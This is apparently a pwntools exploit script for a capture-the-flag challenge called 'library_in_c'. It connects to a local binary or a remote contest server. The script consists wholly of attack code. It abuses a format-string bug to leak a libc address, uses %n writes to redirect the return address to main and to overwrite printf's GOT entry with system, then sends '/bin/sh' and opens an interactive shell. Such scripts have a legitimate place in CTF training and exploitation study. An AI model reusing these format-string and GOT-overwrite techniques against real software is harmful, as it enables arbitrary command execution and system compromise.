from pwn import *
import sys

context.clear(arch = "amd64")

puts_got = 0x601018
printf_got = 0x601030
main_addr = 0x400748

if len(sys.argv) == 1:
    puts_offset = 0x809c0
    system_offset = 0x4f440
    r = process("./library_in_c")
    log.info("pid = {}".format(r.pid))
    # sleep(5)
else:
    puts_offset = 0x6f690 
    system_offset = 0x45390
    r = remote("shell.actf.co", 20201)
    sleep(0.1)

r.recv(0x100)

# leak libc base
payload = b"%10$s!%24$lx!!!!" + p64(puts_got)
r.sendline(payload)

r.recvuntil("Why hello there ")

puts_addr = r.recvuntil("!")[:-1]
puts_addr = u64(puts_addr + b"\x00" * (8 - len(puts_addr)))
return_addr = int(r.recvuntil("!")[:-1], 16) + (0x7fffffffe4e8 - 0x7fffffffe5c0)

libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset

log.info("libc_base = {}".format(hex(libc_base)))
log.info("return_addr = {}".format(hex(return_addr)))
log.info("puts_addr = {}".format(hex(puts_addr)))

if (system_addr & 0xffffffff) >= 0x10000000:
    log.info("write num is too large")
    sys.exit(1)

# ret2main
writenum = main_addr
payload = "%" + str(writenum) + "c%20$n" + "%" + str(0xffff - (writenum & 0xffff) + 1) + "c%21$hn"
if len(payload) > 32:
    log.info("payload is too long")
    sys.exit(1)
payload += "!" * (32 - len(payload))
payload = payload.encode("utf-8") + p64(return_addr) + p64(return_addr + 4)
print(payload)
print(len(payload))

r.sendline(payload)

# got over write
writenum = system_addr & 0xffffffff
writenum2 = (system_addr & 0xffff00000000) >> 32
payload = "%" + str(writenum & 0xffffffff) + "c%12$n" + "%" + str(0xffff - (writenum & 0xffff) + 1 + writenum2) + "c%13$hn"
if len(payload) > 32:
    log.info("payload is too long")
    sys.exit(1)
payload += "!" * (32 - len(payload))
payload = payload.encode("utf-8") + p64(printf_got) + p64(printf_got + 4)

r.sendline(payload)

r.sendline("/bin/sh")

r.interactive()

